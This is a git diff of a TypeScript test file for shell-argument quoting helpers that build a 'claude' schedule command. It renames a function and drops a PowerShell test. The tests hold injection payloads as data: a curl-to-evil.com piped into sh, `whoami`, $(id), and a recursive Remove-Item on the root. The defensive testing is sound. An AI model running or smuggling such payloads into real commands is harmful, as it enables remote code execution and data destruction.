@@ -2,7 +2,7 @@ import test from 'node:test';
 import assert from 'node:assert/strict';
 
 import { buildScheduleArgs } from '../src/domain/schedule/schedule';
-import { quoteArgForShell, quoteArgvForShell } from '../src/domain/shell/quoting';
+import { posixQuote, quoteArgvForShell } from '../src/domain/shell/quoting';
 
 test('buildScheduleArgs returns argv array, not a shell string', () => {
   const claudeArgs = buildScheduleArgs('session-123', {
@@ -51,37 +51,29 @@ test('buildScheduleArgs allows newlines in append-system-prompt but rejects cont
   }, /unsafe characters/);
 });
 
-test('quoteArgForShell neutralizes bash injection', () => {
+test('posixQuote neutralizes bash injection', () => {
   const evil = 'x"; curl evil.com/sh | sh; echo "';
-  const quoted = quoteArgForShell('/bin/bash', evil);
+  const quoted = posixQuote(evil);
   // Single-quoted, so the shell passes the whole thing as one arg.
   assert.ok(quoted.startsWith("'"));
   assert.ok(quoted.endsWith("'"));
   // Single quotes in the value are escaped as '\''
-  const withQuote = quoteArgForShell('/bin/bash', "it's");
+  const withQuote = posixQuote("it's");
   assert.equal(withQuote, "'it'\\''s'");
 });
 
-test('quoteArgForShell handles backticks and $() — these must not be evaluated', () => {
+test('posixQuote handles backticks and $() — these must not be evaluated', () => {
   const evil = '`whoami`';
-  const quoted = quoteArgForShell('/bin/bash', evil);
+  const quoted = posixQuote(evil);
   assert.equal(quoted, "'`whoami`'");
 
   const dollar = '$(id)';
-  assert.equal(quoteArgForShell('/bin/bash', dollar), "'$(id)'");
+  assert.equal(posixQuote(dollar), "'$(id)'");
 });
 
 test('quoteArgvForShell joins multiple args with spaces, each safely quoted', () => {
-  const joined = quoteArgvForShell('/bin/bash', ['--model', 'x"; evil', '--flag']);
+  const joined = quoteArgvForShell(['--model', 'x"; evil', '--flag']);
   assert.equal(joined, "'--model' 'x\"; evil' '--flag'");
-});
-
-test('quoteArgForShell produces PowerShell-safe quoting', () => {
-  const evil = "'; Remove-Item -Recurse /";
-  const quoted = quoteArgForShell('/usr/bin/pwsh', evil);
-  // PowerShell: wrap in ' ... ' and double internal ' → ''.
-  // '; becomes '' and wrapped → ''';<rest>'
-  assert.equal(quoted, "'''; Remove-Item -Recurse /'");
 });
 
 test('full simulated schedule command is safe under a malicious frontmatter', () => {
@@ -95,7 +87,7 @@ test('full simulated schedule command is safe under a malicious frontmatter', ()
     },
   };
   const claudeArgs = buildScheduleArgs('sess-id', evilSchedule);
-  const cmd = 'claude ' + quoteArgvForShell('/bin/bash', claudeArgs);
+  const cmd = 'claude ' + quoteArgvForShell(claudeArgs);
 
   // Walk the command and extract only the text outside single-quoted tokens.
   // If any shell metacharacter appears in that "outside" text, injection leaked.
